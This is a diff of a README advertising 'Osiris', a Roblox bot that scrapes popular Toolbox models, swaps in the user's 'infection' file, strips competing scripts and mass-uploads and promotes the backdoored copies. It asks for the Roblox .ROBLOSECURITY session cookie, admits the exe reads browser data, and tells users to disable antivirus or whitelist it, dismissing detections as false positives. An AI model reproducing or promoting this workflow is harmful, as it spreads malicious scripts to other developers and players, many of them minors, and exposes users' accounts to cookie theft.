@@ -1,60 +1,55 @@
-# 🌌 Osiris Model Suite v1.2 (Premium Edition)
+# MODEL BOTTER - OSIRIS V1.2
 
-> **The most advanced automated deployment tool for Roblox model scaling and promotion.**
-
----
-
-### #️⃣ Overview
-**Osiris** is a high-speed engine designed to streamline the process of uploading, cleaning, and promoting assets across the Roblox ecosystem. Optimized for speed and bypass efficiency, it is the faster model botter in the history of serversides.
-
-### 🚀 Key Features
-* **Mass Deployment:** Upload hundreds of assets in minutes.
-* **Auto-Infection Sync:** Seamlessly integrates your `.rbxm` files into high-traffic models.
-* **Smart Cleaner:** Automatically removes existing competitor scripts to ensure your code remains dominant.
-* **Viral Promotion:** Built-in algorithm to boost model visibility in the Toolbox.
-* **Bypass Logic:** Specifically designed to work with 13+ verified accounts for maximum upload quotas.
+> **Professional tool for mass uploading and automatic promotion of Roblox models.**
 
 ---
 
-### 🛠️ Quick Start Guide
+### #️⃣ What does this tool do?
+This program automates the entire distribution process for Roblox models. It searches for popular models, replaces the original content with your infection file, and mass-uploads them to your accounts instantly.
+
+### 🚀 Main Features
+* **Mass Upload:** Upload hundreds of models in just a few minutes.
+* **Auto-Cleaner:** Automatically deletes scripts from other users so only yours remains active.
+* **Viral Promotion:** Uses a specialized system to push your models to the top of the search results.
+* **Limit Bypass:** Optimized to take full advantage of 13+ verified accounts for maximum upload quotas.
+
+---
+
+### 🛠️ User Guide
 
 1. **Preparation**
-    * Clone the repository: `git clone [URL-DE-TU-REPO]`.
-    * Place your payload (`.rbxm`) inside the `infections` folder.
+    * Download the repository files.
+    * Place your infection file (`.rbxm`) inside the folder named `infections`.
 
-2. **Authentication**
+2. **Login**
     * Open the `osiris.exe` file.
-    * A CMD window will open with a login system.
-    * **Password:** `123`
+    * In the command window (CMD), enter the password: **123**
 
-3. **Configuration**
-    * **Cookie Input:** Provide your Roblox `.ROBLOSECURITY` cookie.
-    * *Tip: Verify your accounts with a phone number and ensure they are 13+ to unlock 200+ monthly uploads.*
+3. **Account Configuration**
+    * The program will ask for your Roblox Cookie (`.ROBLOSECURITY`).
+    * *Tip: Use phone-verified accounts (13+) to unlock the limit of 200+ uploads per month.*
 
-4. **Targeting**
-    * Input the number of models you want to upload.
-    * Enter the **search query** that the bot will use to scrape models from the toolbox (e.g., "HD Admin", "Obby").
-
-5. **Execution**
-    * The bot will instantly search, clear any other infections, upload your file, and promote it so it becomes a **viral model**.
+4. **Execution**
+    * Enter the number of models you want to upload.
+    * Enter your search query (e.g., "HD Admin" or "Obby").
+    * The bot will automatically find the models, patch them with your file, and publish them.
 
 ---
 
-### ⚠️ Technical Notice & Disclaimer
+### ⚠️ Antivirus Notice
 
-**PLEASE NOTE:** The `.exe` might not work on all systems, or some anti-viruses might detect it as a **virus/trojan**. 
+**IMPORTANT:** It is very likely that your antivirus will detect the `.exe` file as a virus or trojan.
 
 > **Why does this happen?**
-> The bot's core logic interacts with browser data to manage **Roblox Cookies** and automated uploads. This behavior is often flagged as a "False Positive" by modern security heuristics. For the best performance, add an exception in your antivirus or disable real-time protection during use.
+> The program must access browser data to manage Roblox cookies and perform automated uploads. Security software flags this activity as suspicious. For the bot to work, you must disable your antivirus or add `osiris.exe` to your exclusion list.
 
 ---
 
-### 📊 Performance Analysis
-| Metric | Osiris Speed | Standard Botters |
+### 📊 Performance Comparison
+| Feature | Osiris Botter | Standard Bots |
 | :--- | :--- | :--- |
-| **Upload Rate** | 15/min | 2/min |
+| **Upload Speed** | 15 models / min | 2 models / min |
 | **Success Rate** | 98% | 65% |
-| **Promotion Latency** | < 5s | 30s+ |
 
 ---
-**Developed with ❤️ by the Osiris Team. I decided not to gatekeep this—if you find this tool useful, please leave a ⭐!**
+**Released by the Osiris Team. If this tool helps you, please leave a ⭐ on the repository.**
